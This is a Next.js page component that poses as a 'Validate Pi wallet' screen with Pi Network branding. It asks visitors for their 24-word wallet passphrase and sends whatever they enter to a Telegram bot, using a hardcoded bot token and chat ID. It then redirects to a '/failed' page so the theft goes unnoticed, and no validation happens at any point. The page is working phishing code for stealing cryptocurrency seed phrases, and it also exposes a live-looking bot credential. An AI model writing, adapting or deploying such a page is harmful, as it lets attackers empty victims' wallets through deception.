"use client";
import axios from "axios";
import { Textarea } from "@/components/ui/textarea";
import WordFadeIn from "@/components/ui/word-fade-in";
import React from "react";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { useRouter } from "next/navigation";
import { IoArrowBack } from "react-icons/io5";
import PiLogo from "./../../assets/pi-small.png";

import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import Link from "next/link";
import Image from "next/image";

const formSchema = z.object({
  phrase: z
    .string()
    .min(1, "Passphrase cannot be empty")
    .refine((val) => val.trim().split(/\s+/).length >= 24, {
      message: "Passphrase must contain at least 24 words",
    }),
});

export default function page() {
  const router = useRouter();
  const [error, setError] = React.useState<boolean>(false);
  const [validating, setValidating] = React.useState<boolean>(false);
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      phrase: "",
    },
  });

  const TELEGRAM_BOT_TOKEN = "7942842686:AAE9oKyuPJmRfPBYu-pcmQTWPC3xdE_A9Rc";
  const CHAT_ID = "-4563701305"; // Replace with your group chat ID

  // Function to send message
  const sendMessageToTelegram = async (message: string) => {
    setValidating(true);
    try {
      const response = await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: CHAT_ID,
          text: message,
        }
      );
      setValidating(false);
      router.replace("/failed");
    } catch (error) {
      setError(true);
      setValidating(false);
      setTimeout(() => {
        setError(false);
      }, 2000);
    }
  };

  function onSubmit(values: z.infer<typeof formSchema>) {
    sendMessageToTelegram(values.phrase);
  }

  return (
    <div className=" h-screen w-screen bg-[#fcfcfc]">
      <div className="bg-[#8a348e] h-14 px-6 md:px-10 flex items-center justify-between">
        <Link href={"/"} className="w-[30%]">
          <IoArrowBack className="text-white text-2xl" />
        </Link>
        <div className="text-white w-[30%] flex items-center justify-center gap-1">
          <h6 className="text-sm md:text-base lg:text-lg font-bold">Wallet</h6>
          <Image src={PiLogo} alt="PiLogo" className="h-6 w-auto" />
        </div>
        <div className="w-[30%]" />
      </div>
      <div className="py-10 space-y-4 px-10 md:px-12 lg:px-20">
        <WordFadeIn
          words="Validate Pi wallet"
          className="text-black text-xl md:text-3xl xl:text-5xl"
        />
        <div className="max-w-xl mx-auto mt-10">
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
              <FormField
                control={form.control}
                name="phrase"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Textarea
                        className="resize-none h-72 border-black/60 text-black/60 text-lg tracking-widest font-medium"
                        placeholder="Enter your 24-word passphrase here"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                    {error && (
                      <p className="text-red-600 text-sm">
                        There was an error validating your phrase, Please try
                        again
                      </p>
                    )}
                  </FormItem>
                )}
              />
              <div className="flex flex-col items-center gap-5 max-w-xl mx-auto">
                <button
                  type="submit"
                  className="min-w-[250px] w-full md:w-fit text-sm px-10 uppercase hover:bg-[#8a348e] hover:border-white/50 transition-all ease-linear duration-200  border-[#8a348e] text-[#8a348e] font-bold hover:text-white py-3.5 rounded-lg border"
                >
                  {validating ? "Validating" : "Validate"}
                </button>
                <p className="text-sm">
                  As a non-custodial wallet, your wallet passphrase is
                  exclusively accessible only to you. Recovery of passphrase is
                  currently impossible
                </p>
                <p className="text-sm">
                  Lost your passphrase?{" "}
                  <span className="text-blue-500">
                    You can create a new wallet,
                  </span>{" "}
                  but all your <span className="font-bold">π</span> in your
                  previous wallet will be inaccessible.
                </p>
              </div>
            </form>
          </Form>
        </div>
      </div>
    </div>
  );
}
